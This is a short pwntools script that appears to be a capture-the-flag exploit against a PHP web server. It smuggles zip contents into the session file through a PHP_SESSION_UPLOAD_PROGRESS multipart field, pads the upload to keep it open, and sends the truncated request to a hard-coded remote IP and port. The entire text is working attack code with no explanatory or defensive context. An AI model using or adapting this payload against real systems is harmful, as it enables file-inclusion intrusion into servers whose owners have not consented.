from pwn import *
with open("c.zip", "rb") as f:
    data = f.read()

session = "pepega"
PREFIX = "upload_progress_"
payload = data[len(PREFIX):]

# print(filename_upload.index(b'N'))

body = b'-----------------------------9051914041544843365972754266\r\n'
body += b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n'
body += b'\r\n'
body += payload
body += b'-----------------------------9051914041544843365972754266--\r\n'

body += b'-----------------------------9051914041544843365972754266\r\n'
body += b'Content-Disposition: form-data; name="file1"; filename="kms"\r\n'
body += b'Content-Type: text/plain\r\n'
body += b'\r\n'
body += b'A' * 300000
body += b'\r\n'
body += b'-----------------------------9051914041544843365972754266--\r\n'

body += b'\r\n'

p = b'POST / HTTP/1.1\r\n'
p += b'Connection: close\r\n'
p += 'Cookie: PHPSESSID={}\r\n'.format(session).encode()
p += b'Host: localhost\r\n'
p += b'Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266\r\n'
p += 'Content-Length: {}\r\n\r\n'.format(len(body)).encode()
p += body

s = remote('111.186.59.2', 50082)
s.send(p[:-100])

s.interactive()

